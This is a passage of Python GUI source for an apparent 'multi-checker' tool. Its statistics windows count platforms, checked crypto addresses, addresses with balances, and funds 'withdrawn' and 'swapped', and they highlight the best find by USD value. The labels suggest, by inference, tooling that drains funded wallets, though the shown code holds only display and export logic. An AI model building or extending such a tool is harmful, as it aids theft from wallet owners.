            (i18n.t("errors"),  errors, YELLOW, 80),
        ]:
            bw  = int((cnt/mx)*290) if mx else 0
            pct = f"{cnt*100//total}%" if total else "0%"
            cv.create_rectangle(130, y, 130+max(bw,3), y+22, fill=clr, outline="")
            cv.create_text(6,   y+11, text=f"{lbl}: {cnt}", anchor="w",
                           fill=TEXT, font=("Segoe UI",11))
            cv.create_text(460, y+11, text=pct, anchor="e",
                           fill=clr, font=("Segoe UI",11,"bold"))

        ctk.CTkLabel(win, text=i18n.t("stats_by_platform"),
                     font=("Segoe UI",14,"bold"), text_color=TEXT
                     ).pack(padx=20, anchor="w")
        sc = ctk.CTkScrollableFrame(win, fg_color=CARD, corner_radius=10, height=160)
        sc.pack(padx=20, pady=(4,20), fill="both", expand=True)
        if self._platform_stats:
            for plat, cnt in sorted(self._platform_stats.items(), key=lambda x:-x[1]):
                row = ctk.CTkFrame(sc, fg_color="transparent")
                row.pack(fill="x", padx=8, pady=2)
                ctk.CTkLabel(row, text=plat, font=("Segoe UI",12),
                             text_color=TEXT).pack(side="left")
                ctk.CTkLabel(row, text=f"{cnt} {i18n.t('stats_found')}",
                             font=("Segoe UI",12,"bold"),
                             text_color=ACCENT).pack(side="right")
        else:
            ctk.CTkLabel(sc, text="  —", font=("Segoe UI",12), text_color=MUTED).pack()
    
    def _show_crypto_extended_stats(self, w):
        """Показать расширенную статистику для Crypto чекера."""
        # Завершаем сессию для получения финальной статистики
        self.checkers["Crypto"].end_session()
        stats = self.checkers["Crypto"].get_session_stats()
        
        win = ctk.CTkToplevel(self)
        win.title("📊 Расширенная статистика Crypto")
        win.geometry("680x720")
        win.configure(fg_color=BG)
        win.attributes("-topmost", True)
        
        # Заголовок
        ctk.CTkLabel(win, text="📊 Расширенная статистика",
                     font=("Segoe UI", 20, "bold"), text_color=TEXT
                     ).pack(pady=(20, 10))
        
        # Основные метрики
        main_frame = ctk.CTkFrame(win, fg_color="transparent")
        main_frame.pack(padx=20, pady=10, fill="x")
        main_frame.grid_columnconfigure((0,1,2,3), weight=1)
        
        metrics = [
            ("Проверено", stats["total_checked"], ACCENT),
            ("С балансом", stats["total_with_balance"], GREEN),
            ("Выведено", stats["total_withdrawn"], PURPLE),
            ("Обменено", stats["total_swapped"], ORANGE),
        ]
        
        for col, (label, value, color) in enumerate(metrics):
            card = ctk.CTkFrame(main_frame, fg_color=CARD, corner_radius=12)
            card.grid(row=0, column=col, padx=4, sticky="ew")
            ctk.CTkLabel(card, text=label, font=("Segoe UI", 10),
                         text_color=MUTED).pack(pady=(10, 0))
            ctk.CTkLabel(card, text=str(value), font=("Segoe UI", 22, "bold"),
                         text_color=color).pack()
            ctk.CTkFrame(card, height=3, fg_color=color, corner_radius=2
                         ).pack(fill="x", padx=12, pady=(4, 10))
        
        # Общая сумма и скорость
        info_frame = ctk.CTkFrame(win, fg_color=CARD, corner_radius=10)
        info_frame.pack(padx=20, pady=10, fill="x")
        info_frame.grid_columnconfigure((0,1,2), weight=1)
        
        ctk.CTkLabel(info_frame, text="💰 Общая сумма:",
                     font=("Segoe UI", 12), text_color=MUTED
                     ).grid(row=0, column=0, padx=15, pady=12, sticky="w")
        ctk.CTkLabel(info_frame, text=f"${stats['total_usd']:,.2f}",
                     font=("Segoe UI", 16, "bold"), text_color=GREEN
                     ).grid(row=0, column=1, padx=15, pady=12, sticky="w")
        
        duration_text = stats.get("duration_formatted", "N/A")
        speed_text = f"{stats.get('checks_per_second', 0):.1f} адр/сек"
        
        ctk.CTkLabel(info_frame, text=f"⏱️ {duration_text}  •  ⚡ {speed_text}",
                     font=("Segoe UI", 11), text_color=MUTED
                     ).grid(row=0, column=2, padx=15, pady=12, sticky="e")
        
        # Лучшая находка
        if stats["best_find"]["amount"] > 0:
            best_frame = ctk.CTkFrame(win, fg_color=CARD2, corner_radius=10)
            best_frame.pack(padx=20, pady=10, fill="x")
            
            ctk.CTkLabel(best_frame, text="🏆 Лучшая находка",
                         font=("Segoe UI", 14, "bold"), text_color=YELLOW
                         ).pack(pady=(12, 4), anchor="w", padx=15)
            
            best_info = ctk.CTkFrame(best_frame, fg_color="transparent")
            best_info.pack(fill="x", padx=15, pady=(0, 12))
            
            ctk.CTkLabel(best_info, text=stats["best_find"]["address"],
                         font=("Consolas", 11), text_color=TEXT
                         ).pack(anchor="w")
            ctk.CTkLabel(best_info, 
                         text=f"${stats['best_find']['amount']:,.2f}  •  {stats['best_find']['chain']}",
                         font=("Segoe UI", 12, "bold"), text_color=GREEN
                         ).pack(anchor="w", pady=(2, 0))
        
        # Статистика по сетям
        ctk.CTkLabel(win, text="📍 Статистика по сетям",
                     font=("Segoe UI", 14, "bold"), text_color=TEXT
                     ).pack(padx=20, pady=(10, 4), anchor="w")
        
        chains_frame = ctk.CTkScrollableFrame(win, fg_color=CARD, corner_radius=10, height=200)
        chains_frame.pack(padx=20, pady=(0, 10), fill="both", expand=True)
        
        if stats["by_chain"]:
            for chain, data in sorted(stats["by_chain"].items(), 
                                     key=lambda x: x[1]["total_usd"], reverse=True):
                row = ctk.CTkFrame(chains_frame, fg_color=CARD2, corner_radius=8)
                row.pack(fill="x", padx=8, pady=4)
                
                left_frame = ctk.CTkFrame(row, fg_color="transparent")
                left_frame.pack(side="left", padx=12, pady=8)
                
                ctk.CTkLabel(left_frame, text=chain.upper(),
                             font=("Segoe UI", 12, "bold"), text_color=ACCENT
                             ).pack(anchor="w")
                ctk.CTkLabel(left_frame, text=f"{data['count']} адресов",
                             font=("Segoe UI", 10), text_color=MUTED
                             ).pack(anchor="w")
                
                ctk.CTkLabel(row, text=f"${data['total_usd']:,.2f}",
                             font=("Segoe UI", 13, "bold"), text_color=GREEN
                             ).pack(side="right", padx=12, pady=8)
        else:
            ctk.CTkLabel(chains_frame, text="Нет данных",
                         font=("Segoe UI", 11), text_color=MUTED
                         ).pack(pady=20)
        
        # Кнопка экспорта
        export_btn = ctk.CTkButton(
            win, text="💾 Экспортировать статистику",
            font=("Segoe UI", 12, "bold"),
            fg_color=PURPLE, hover_color="#a371f7",
            corner_radius=8, height=38,
            command=lambda: self._export_crypto_stats(stats)
        )
        export_btn.pack(padx=20, pady=(10, 20), fill="x")
    
    def _export_crypto_stats(self, stats):
        """Экспортировать статистику в JSON файл."""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"crypto_stats_{timestamp}.json"
            
            import json
            with open(filename, "w", encoding="utf-8") as f:
                json.dump(stats, f, indent=2, ensure_ascii=False)
            
            print(f"✓ Статистика сохранена в {filename}")
        except Exception as e:
            print(f"✗ Ошибка экспорта: {e}")


if __name__ == "__main__":
    app = MultiCheckerApp()
    app.mainloop()
